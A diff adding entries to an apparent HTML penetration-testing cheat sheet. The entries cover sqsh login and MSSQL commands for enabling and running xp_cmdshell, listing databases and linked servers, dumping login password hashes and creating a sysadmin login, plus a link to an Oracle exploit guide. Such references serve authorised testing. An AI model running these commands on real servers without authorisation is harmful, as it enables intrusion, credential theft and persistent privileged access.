@@ -1592,7 +1592,69 @@ conn conceal
     host = &lt;ip&gt;
     port = &lt;port #&gt;
     tds version = &lt;Examples: 5.0, 7.3, 8.0&gt;</pre>
+    <li>Commands</li>
+    <table>
+        <tr>
+            <td>Login</td>
+            <td>sqsh -S &lt;ip&gt; -U &lt;user&gt; -P &lt;password&gt;<br>&lt;ip address&gt; can be replaced with hostname if specified in freetds.config file</td>
+        </tr>
+        <tr>
+            <td>Send command</td>
+            <td>go (after entering command)</td>
+        </tr>
+    </table>
 </ul>
+<li>Mssql commands</li>
+<table>
+    <tr>
+        <td>Run shell command</td>
+        <td>EXEC xp_cmdshell '&lt;command&gt;</td>
+    </tr>
+    <tr>
+        <td>Enable xp_cmdshell</td>
+        <td>EXEC sp_configure 'show advanced options', 1;<br>RECONFIGURE;<br>EXEC sp_configure 'xp_cmdshell', 1;<br>RECONFIGURE;</td>
+    </tr>
+    <tr>
+        <td>View databases</td>
+        <td>SELECT name FROM master.dbo.sysdatabases</td>
+    </tr>
+    <tr>
+        <td>Select/use a database</td>
+        <td>use &lt;db&gt;</td>
+    </tr>
+    <tr>
+        <td>Get table names</td>
+        <td>SELECT * FROM &lt;db name&gt;.INFORMATION_SCHEMA.TABLES;<br>(use &lt;db&gt; first)SELECT name FROM sysobjects WHERE xtype = 'U'</td>
+    </tr>
+    <tr>
+        <td>List linked servers</td>
+        <td>EXEC sp_linkedservers<br>SELECT * FROM sys.servers;</td>
+    </tr>
+    <tr>
+        <td>List users</td>
+        <td>select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;</td>
+    </tr>
+    <tr>
+        <td>Create user with sysadmin privs</td>
+        <td>CREATE LOGIN &lt;username&gt; WITH PASSWORD = '&lt;password&gt;'<br>sp_addsrvrolemember '&lt;username&gt;', 'sysadmin</td>
+    </tr>
+    <tr>
+        <td>View password hashes</td>
+        <td>SELECT name, password_hash FROM master.sys.sql_logins</td>
+    </tr>
+    <tr>
+        <td>View permissions</td>
+        <td>SELECT * FROM fn_my_permissions(NULL, 'SERVER');</td>
+    </tr>
+</table>
+
+<h2>1521 TCP / Oracle TNS Listener</h2>
+
+<li>Oracle DB exploit guide</li>
+<ul>
+    blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf
+</ul>
+
 
 </body>
 </html>
